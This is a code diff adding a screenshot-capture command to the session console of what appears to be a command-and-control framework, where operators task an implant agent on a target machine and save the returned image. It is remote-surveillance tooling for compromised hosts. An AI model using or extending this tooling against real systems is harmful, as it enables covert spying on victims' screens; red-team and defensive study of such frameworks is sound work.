@@ -6,6 +6,7 @@ Provides MSF-style session interaction:
 - sessions results <id> — Output of commands the agent already answered
 - sessions download <id> <remote> [local] — Pull a file off the target
 - sessions upload <id> <local> <remote> — Push a file to the target
+- sessions screenshot <id> [local] — Capture the target's screen
 - sessions kill <id> — Kill session
 - sessions info <id> — Session details
 - sessions rename <id> <name> — Relabel a session for operators
@@ -246,6 +247,60 @@ async def sessions_upload(tui: Any, args: List[str]) -> Dict[str, Any]:
 
     tui.render_success(f"Uploaded {offset} bytes to {remote}")
     return {"status": "ok", "session_id": session_id, "remote": remote, "bytes": offset}
+
+
+async def sessions_screenshot(tui: Any, args: List[str]) -> Dict[str, Any]:
+    """Capture the target's screen and save the image locally.
+
+    Usage: sessions screenshot <id> [local-path]
+    """
+    import base64
+    import json
+    import os
+    import time
+
+    if not args:
+        tui.render_error("Usage: sessions screenshot <id> [local]")
+        return {"status": "error", "error": "Usage: sessions screenshot <id> [local]"}
+
+    session_id = args[0]
+    local = args[1] if len(args) > 1 else os.path.join(
+        ".", "downloads", f"screenshot-{int(time.time())}.png"
+    )
+
+    engine = tui._engine
+    if await engine.sessions.get(session_id) is None:
+        tui.render_error(f"Session not found: {session_id}")
+        return {"status": "error", "error": f"Session not found: {session_id}"}
+
+    raw = await _run_agent_command(
+        engine, session_id, json.dumps({"action": "screenshot"}), interaction_timeout(tui)
+    )
+    if raw is None:
+        tui.render_error("Agent did not answer the capture request (still beacons?).")
+        return {"status": "error", "error": "screenshot timed out"}
+    try:
+        payload = json.loads(raw)
+    except json.JSONDecodeError:
+        tui.render_error(f"Agent returned an unreadable capture: {raw[:200]}")
+        return {"status": "error", "error": "unreadable capture"}
+    if "error" in payload:
+        # An agent built without --screenshot answers this way rather than
+        # pretending the capture happened.
+        tui.render_error(f"Capture failed: {payload['error']}")
+        return {"status": "error", "error": payload["error"]}
+
+    data = base64.b64decode(payload.get("data", ""))
+    if not data:
+        tui.render_error("Agent reported success but sent no image data.")
+        return {"status": "error", "error": "empty capture"}
+    parent = os.path.dirname(os.path.abspath(local))
+    os.makedirs(parent, exist_ok=True)
+    with open(local, "wb") as sink:
+        sink.write(data)
+
+    tui.render_success(f"Saved {len(data)}-byte screenshot to {local}")
+    return {"status": "ok", "session_id": session_id, "local": local, "bytes": len(data)}
 
 
 async def _run_agent_command(engine: Any, session_id: str, command: str, timeout: float) -> Optional[str]:
